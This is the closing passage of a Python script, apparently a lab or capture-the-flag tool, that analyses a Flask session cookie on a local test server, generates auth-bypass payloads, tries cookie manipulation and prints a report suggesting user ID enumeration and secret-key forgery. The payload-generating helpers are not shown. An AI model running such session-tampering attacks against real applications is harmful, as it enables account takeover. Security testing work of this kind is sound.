    """
    Main execution - analyze Flask session cookies for auth bypass
    """
    # Configuration
    base_url = "http://127.0.0.1:33198"
    username = "test"
    password = "test"
    
    # Use the provided session cookie for analysis
    provided_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfHAw.APUhSPhEQP-aHd6h-ptsEYSzmao"
    
    print(f"\n[+] Using provided session cookie for initial analysis")
    print(f"[+] Cookie value: {provided_cookie}")
    
    # Analyze the session cookie
    analysis = analyze_session_security(provided_cookie)
    
    # Generate auth bypass payloads
    bypass_payloads = generate_auth_bypass_payloads(
        provided_cookie,
        analysis.get('decoded')
    )
    
    # Test authentication flow
    session, auth_response = test_authentication_flow(base_url, username, password)
    
    # If we got a new cookie from auth, analyze it too
    if session and 'session' in session.cookies:
        new_cookie = session.cookies['session']
        if new_cookie != provided_cookie:
            print(f"\n[+] New session cookie obtained from authentication!")
            print(f"[+] New cookie: {new_cookie}")
            analysis_new = analyze_session_security(new_cookie)
    
    # Test cookie manipulation
    test_cookie_manipulation(base_url, provided_cookie, bypass_payloads)
    
    # Generate final report
    print(f"\n{'='*70}")
    print(f"FINAL SECURITY REPORT")
    print(f"{'='*70}")
    
    print(f"\n[+] Session Cookie Analysis:")
    print(f"    - Raw cookie: {analysis['raw_cookie']}")
    print(f"    - Can decode: {analysis['can_decode']}")
    
    if analysis['session_data']:
        print(f"\n[+] Session Data:")
        for key, value in analysis['session_data'].items():
            print(f"    - {key}: {value}")
    
    print(f"\n[+] Vulnerabilities Found: {len(analysis['vulnerabilities'])}")
    for i, vuln in enumerate(analysis['vulnerabilities'], 1):
        print(f"\n    {i}. {vuln['type']} (Severity: {vuln['severity']})")
        print(f"       {vuln['details']}")
        print(f"       Exploitation: {vuln['exploitation']}")
    
    print(f"\n[+] Auth Bypass Payloads Generated: {len(bypass_payloads)}")
    
    print(f"\n[+] Recommendations:")
    if analysis['vulnerabilities']:
        print(f"    [!] {len(analysis['vulnerabilities'])} security issues found!")
        print(f"    [+] Test enumerated user IDs for horizontal privilege escalation")
        print(f"    [+] Attempt to identify Flask secret key for session forgery")
        print(f"    [+] Check for session fixation or session prediction vulnerabilities")
    else:
        print(f"    [+] No critical vulnerabilities detected in session structure")
    
    # Summary
    print(f"\n{'='*70}")
    print(f"SUMMARY")
    print(f"{'='*70}")
    print(f"[+] Flask session uses signed cookie format (itsdangerous)")
    print(f"[+] Session data contains: {list(analysis['session_data'].keys()) if analysis['session_data'] else 'N/A'}")
    print(f"[+] Auth bypass requires either:")
    print(f"    1. Enumerating valid user IDs (horizontal escalation)")
    print(f"    2. Obtaining Flask secret key to forge sessions (vertical escalation)")
    print(f"\n[] Analysis complete!")

if __name__ == "__main__":
    main()

